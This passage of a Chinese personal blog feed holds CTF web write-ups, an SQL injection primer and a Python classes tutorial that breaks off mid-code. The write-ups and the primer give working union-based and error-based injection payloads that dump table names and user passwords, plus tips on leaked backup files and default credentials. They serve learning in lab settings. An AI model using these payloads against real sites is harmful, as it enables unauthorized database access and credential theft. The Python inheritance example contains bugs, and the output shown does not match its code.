class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;/**/or/**/1=1/**/union/**/select/**/1,2,3/**/#&amp;password=123（判断回显位置）password随便写就行</span><br><span class="line">username=123&#x27;/**/or/**/1=1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/#&amp;password=123  #获取表名</span><br><span class="line">username=123&#x27;/**/or/**/1=1/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;/**/#&amp;password=123  #获取列名</span><br><span class="line">username=123&#x27;/**/or/**/1=1/**/union/**/select/**/1,group_concat(flag),3/**/from/**/flag/**/#&amp;password=123  #拿到flag</span><br></pre></td></tr></table></figure><h5 id="web-7"><a href="#web-7" class="headerlink" title="web-7"></a>web-7</h5><h5 id="web-8"><a href="#web-8" class="headerlink" title="web-8"></a>web-8</h5><p>都是一样的，找到注入点后用python自动化脱库脚本爆破就好了</p><h5 id="web-9"><a href="#web-9" class="headerlink" title="web-9"></a>web-9</h5><p>vim在异常关闭时会产生swp可交换文件</p><p>这道题的答案就是在里面的</p><h5 id="web-10"><a href="#web-10" class="headerlink" title="web-10"></a>web-10</h5><p>将flag放到cookie里面，刷新网页然后使用F12查看cookie即可</p><h4 id="1-10总结"><a href="#1-10总结" class="headerlink" title="1-10总结"></a>1-10总结</h4><p>前十个里面有这么几种信息收集的方式</p><p>cookie</p><p>swp交换文件</p><p>sql注入</p><p>源码，注释，bp抓包里面</p><p>绕过md5的0E等等</p><p>robots.txt爬虫协议</p><h5 id="web-11"><a href="#web-11" class="headerlink" title="web-11"></a>web-11</h5><p>网站的域名也会隐藏信息</p><p>这道题中用<a href="http://dbcha.com/可以直接获得（A记录改成txt">http://dbcha.com/可以直接获得（A记录改成txt</a></p><h5 id="web-12"><a href="#web-12" class="headerlink" title="web-12"></a>web-12</h5><p>这个题目中，他是一个网站</p><p>登录到/admin里面以后</p><p>要求输入账户密码，账户使用默认账户，密码的话网站中可能存在，所以找了找试了试最下面的电话，成功</p><p><em>常见的渗透思路</em></p><h5 id="web-13"><a href="#web-13" class="headerlink" title="web-13"></a>web-13</h5><p>这个是一个考眼力的题目，他在最下面第三个里有一个唯一小些的document,并且可以打开文档。里面有这个东西的使用</p><p>说明，值得注意的是，里面的</p><p><a href="http://your-domain/是你的域名的意思，在这个题目中的意思就是直接套到靶场的环境上就可以">http://your-domain/是你的域名的意思，在这个题目中的意思就是直接套到靶场的环境上就可以</a></p><h5 id="web-14"><a href="#web-14" class="headerlink" title="web-14"></a>web-14</h5><p>打开之后是一个巨信的界面</p><p>提示说是编译器的问题，所以要在源码中搜索editor</p><p>发现一个这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;editor/upload/banner-app.png&quot; alt=&quot;App&quot;&gt;</span><br></pre></td></tr></table></figure><p>说明是有编译器的（据说是百度的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://000cf48d-1993-417b-97f9-e0c5e21627ff.challenge.ctf.show/editor/</span><br></pre></td></tr></table></figure><p>打开以后可以看到有一系列的文件上传什么的，在插入文件的文件空间中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/editor/attached/file/var/www/html/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure><p>发现这么个东西</p><p>输入到url不对，看了show的视频说是（注意url形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/editor/attached/file/这一段是编译器的绝对路径</span><br><span class="line">var/www/html/</span><br><span class="line">nothinghere/fl000g.txt只需要输入这个就可以了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://000cf48d-1993-417b-97f9-e0c5e21627ff.challenge.ctf.show/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure><h5 id="web-15"><a href="#web-15" class="headerlink" title="web-15"></a>web-15</h5><p>有点社工的感觉，这道题有个邮箱提示，在网站中输入admin可以进入管理员登录界面，刚开始输入邮箱作为密码会提示密码错误，但是有一个忘记密码</p><p>忘记密码的提示是我生活在什么城市，这个可以通过QQ邮箱来进行社工，找到以后就OK了</p><h5 id="web-16"><a href="#web-16" class="headerlink" title="web-16"></a>web-16</h5><p>打开是一个元素周期表，提示说是探针忘记删除了，所以可以通过tz.php进行查看参数，在里面找flag</p><h5 id="web-17"><a href="#web-17" class="headerlink" title="web-17"></a>web-17</h5><p>备份的sql文件会泄露数据</p><p>backup.sql直接进就行</p><h5 id="web-18"><a href="#web-18" class="headerlink" title="web-18"></a>web-18</h5><p>这道题在源码中找js文件，js里面有一个gameover</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b)</span><br></pre></td></tr></table></figure><p>在控制台中构造一个alert即可</p><h5 id="web-19"><a href="#web-19" class="headerlink" title="web-19"></a>web-19</h5><p>在源码中看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="line">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>往上看的话看到p=pazzword，u=username，post传参即可</p><h5 id="web-20"><a href="#web-20" class="headerlink" title="web-20"></a>web-20</h5><p>这个是一个数据库的题，他说自己是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我是asp程序，我用的access数据库</span><br></pre></td></tr></table></figure><p>看了看视频说可以尝试mdb.db或者data.db或db.mdb，第三个成功了</p><p>用查看器查看就能得到（注意要拉开表</p><h4 id="web信息收集总结"><a href="#web信息收集总结" class="headerlink" title="web信息收集总结"></a>web信息收集总结</h4><p>主要还是靠眼力,另外,swp,sql,数据库,探针,编译器等等也会泄露信息</p><p>此外post传参,源码,等等的也会，做题的时候注意一下</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入基本知识</title>
      <link href="/2025/01/08/2023%E5%B9%B44%E6%9C%8824%E6%97%A5-sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/01/08/2023%E5%B9%B44%E6%9C%8824%E6%97%A5-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>url中?表示传参，id表示变量，</p><p>参数类型</p><ol><li>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</li></ol><p>如 www.text.com/text.php?id=3 对应的sql语句为 select * from table where id=3</p><ol><li>字符型：字符型注入正好相反</li></ol><p>当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹</p><p>例如数字型语句：select * from table where id =3</p><p>则字符型如下：select * from table where name=’admin’</p><p>注入手法的话可以分为以下几类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">联合查询注入：union selest</span><br><span class="line">报错注入：</span><br><span class="line">group by（重复键冲）</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"> extractvalue() 函数</span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(&#x27;^&#x27;,(select database()),&#x27;^&#x27;)) --+</span><br><span class="line"> updatexml() 函数</span><br><span class="line">获取数据库名字?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(database()),&#x27;^&#x27;),1) --+</span><br><span class="line">获取当前数据库中表的名字?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; ),&#x27;^&#x27;),1) --+</span><br><span class="line">爆表中的字段?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select column_name from  information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1 ),&#x27;^&#x27;),1) --+</span><br><span class="line">爆字段中的内容?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#x27;^&#x27;),1) --+</span><br><span class="line">布尔盲注</span><br><span class="line">时间盲注</span><br><span class="line">多语句查询注入：</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/114325805</span><br></pre></td></tr></table></figure><p>布尔盲注和时间盲注直接用sqlmap注入吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python--从入门到入土--类</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8829%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E7%B1%BB/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8829%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>类</p><h5 id="创建和使用类以及根据实参来创造事例"><a href="#创建和使用类以及根据实参来创造事例" class="headerlink" title="创建和使用类以及根据实参来创造事例"></a>创建和使用类以及根据实参来创造事例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line">    def __init__(self,name,age):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    def sit(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; is now sitting &quot;)</span><br><span class="line"></span><br><span class="line">    def roll_over(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; rolled over&quot;)</span><br><span class="line"></span><br><span class="line">my_dog = Dog(&quot;willie&quot;,6)</span><br><span class="line">print(f&quot;my dog&#x27;s name is  &#123;my_dog.name&#125;&quot;)</span><br><span class="line">print(f&quot;my dog&#x27;s age is &#123;my_dog.age&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my dog&#x27;s name is  willie</span><br><span class="line">my dog&#x27;s age is 6</span><br></pre></td></tr></table></figure><p>这里的”<em>init</em>（）“是一种特殊的方法，每当你想要根据Dog类创建新的实例的时候，Python就会自动运行它。在这个方法的名称中，开头和结尾默认都有2个下划线，这是为了避免Python将他和其他的普通的方法名称发生冲突。在这个方法的定义的时候，形参self是必不可少的，而且必须为与其他的形参的前面。因为Python在调用这个函数的时候，将会自动传入实参self，每个与实例相关联的方法调用都自动传递实参self，它起到一个指向实例的作用，让实例能够访问类中的属性和方法。后面的def中变量都有前缀self，以self为前缀的变量可供给类中的所有方法使用，可以通过类的所有实例来访问。可通过实例访问的变量称之为属性。</p><p>Dog类还定义了来年各个方法：sit()和roll_over。这些方法执行时不需要额外的信息，因此他们只有一个形参self、</p><h6 id="1-访问属性"><a href="#1-访问属性" class="headerlink" title="1.访问属性"></a>1.访问属性</h6><p>my_dog.name</p><h6 id="2-调用方法"><a href="#2-调用方法" class="headerlink" title="2.调用方法"></a>2.调用方法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line">    def __init__(self,name,age):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    def sit(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; is now sitting &quot;)</span><br><span class="line"></span><br><span class="line">    def roll_over(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; rolled over&quot;)</span><br><span class="line"></span><br><span class="line">my_dog = Dog(&quot;willie&quot;,6)</span><br><span class="line">print(f&quot;my dog&#x27;s name is  &#123;my_dog.name&#125;&quot;)</span><br><span class="line">print(f&quot;my dog&#x27;s age is &#123;my_dog.age&#125;&quot;)</span><br><span class="line">my_dog.sit()</span><br><span class="line">my_dog.roll_over()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my dog&#x27;s name is  willie</span><br><span class="line">my dog&#x27;s age is 6</span><br><span class="line">willie is now sitting </span><br><span class="line">willie rolled over</span><br></pre></td></tr></table></figure><h6 id="3-创造多个实例"><a href="#3-创造多个实例" class="headerlink" title="3.创造多个实例"></a>3.创造多个实例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class Dog:</span><br><span class="line">    def __init__(self,name,age):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    def sit(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; is now sitting &quot;)</span><br><span class="line"></span><br><span class="line">    def roll_over(self):</span><br><span class="line">        print(f&quot;&#123;self.name&#125; rolled over&quot;)</span><br><span class="line"></span><br><span class="line">my_dog = Dog(&quot;willie&quot;,6)</span><br><span class="line">your_dog = Dog(&quot;annn&quot;,2)</span><br><span class="line">print(f&quot;my dog&#x27;s name is  &#123;my_dog.name&#125;&quot;)</span><br><span class="line">print(f&quot;my dog&#x27;s age is &#123;my_dog.age&#125;&quot;)</span><br><span class="line">my_dog.sit()</span><br><span class="line">my_dog.roll_over()</span><br><span class="line"></span><br><span class="line">print(f&quot;your dog&#x27;s name is &#123;your_dog.name&#125;&quot;)</span><br><span class="line">your_dog.sit()</span><br><span class="line">print(f&quot;your dog can roll over,&#123;your_dog.name&#125;,how old is your dog &#123;your_dog.age&#125;&quot;)</span><br><span class="line">your_dog.roll_over()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">my dog&#x27;s name is  willie</span><br><span class="line">my dog&#x27;s age is 6</span><br><span class="line">willie is now sitting </span><br><span class="line">willie rolled over</span><br><span class="line">your dog&#x27;s name is annn</span><br><span class="line">annn is now sitting </span><br><span class="line">your dog can roll over,annn,how old is your dog 2</span><br><span class="line">annn rolled over</span><br></pre></td></tr></table></figure><h5 id="使用类和实例"><a href="#使用类和实例" class="headerlink" title="使用类和实例"></a>使用类和实例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class car:</span><br><span class="line">    def __init__(self,maek,model,year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;,&#x27;a4&#x27;,&#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br></pre></td></tr></table></figure><h6 id="给属性指定默认值"><a href="#给属性指定默认值" class="headerlink" title="给属性指定默认值"></a>给属性指定默认值</h6><p>创建实例时，有些属性无需通过形参来定义，可以再方法”<em>init</em>()”中为其指定默认值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class car:</span><br><span class="line">    def __init__(self,maek,model,year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading=0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;,&#x27;a4&#x27;,&#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br><span class="line">this car has 0 mile on it</span><br></pre></td></tr></table></figure><h5 id="修改属性的值"><a href="#修改属性的值" class="headerlink" title="修改属性的值"></a>修改属性的值</h5><h6 id="直接修改"><a href="#直接修改" class="headerlink" title="直接修改"></a>直接修改</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class car:</span><br><span class="line">    def __init__(self,maek,model,year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading=0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line">    </span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;,&#x27;a4&#x27;,&#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br><span class="line">my_new_car.odometer_reading = 23</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br><span class="line">this car has 23 mile on it</span><br></pre></td></tr></table></figure><h6 id="通过方法修改属性的值"><a href="#通过方法修改属性的值" class="headerlink" title="通过方法修改属性的值"></a>通过方法修改属性的值</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class car:</span><br><span class="line">    def __init__(self,maek,model,year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading=0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self,milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;,&#x27;a4&#x27;,&#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br><span class="line">my_new_car.undate_odometer(23)</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br><span class="line">this car has 23 mile on it</span><br></pre></td></tr></table></figure><h6 id="通过方法对属性的值进行递增"><a href="#通过方法对属性的值进行递增" class="headerlink" title="通过方法对属性的值进行递增"></a>通过方法对属性的值进行递增</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class car:</span><br><span class="line">    def __init__(self, maek, model, year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = 0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self, milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">    def increaing_odometer(self, miles):</span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_new_car = car(&#x27;Aodi&#x27;, &#x27;a4&#x27;, &#x27;2019&#x27;)</span><br><span class="line">print(my_new_car.get_descript_name())</span><br><span class="line">my_new_car.undate_odometer(666)</span><br><span class="line">my_new_car.read_odometer()</span><br><span class="line"></span><br><span class="line">my_new_car.increaing_odometer(1000)</span><br><span class="line">print(my_new_car.read_odometer())</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2019  A4  Aodi</span><br><span class="line">this car has 666 mile on it</span><br><span class="line">this car has 1666 mile on it</span><br><span class="line">None</span><br></pre></td></tr></table></figure><p>？这个none是怎么蹦出来的？</p><h6 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h6><p>子类的方法<em>init</em></p><p>在既有类的基础上编写新的类的时候，通常会调用父类的方法<em>inti</em>。浙江初始化在父类<em>init</em>（）方法来定义的所有属性，从而让子类包含这些属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class car:</span><br><span class="line">    def __init__(self, maek, model, year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = 0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self, milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">    def increaing_odometer(self, miles):</span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line">class electorcar(car):</span><br><span class="line">    def _init_(self,make,model,year):</span><br><span class="line">        super()._init_(maek,model.year)</span><br><span class="line"></span><br><span class="line">my_tesia = electorcar(&#x27;tesla&#x27;,&#x27;model s&#x27;,&#x27;2020&#x27;)</span><br><span class="line">print(my_tesia.get_descript_name())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020  Model S  Tesla</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里super()是一个特殊函数，使得你可以调用弗雷德方法。这一行代码能够使得python调用car类的方法<em>init</em>，让electorcar实例能够包含这个方法的所有属性。父类也称之为超类。</p><h6 id="给子类定义属性和方法"><a href="#给子类定义属性和方法" class="headerlink" title="给子类定义属性和方法"></a>给子类定义属性和方法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print, super</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class car:</span><br><span class="line">    def __init__(self, maek, model, year):</span><br><span 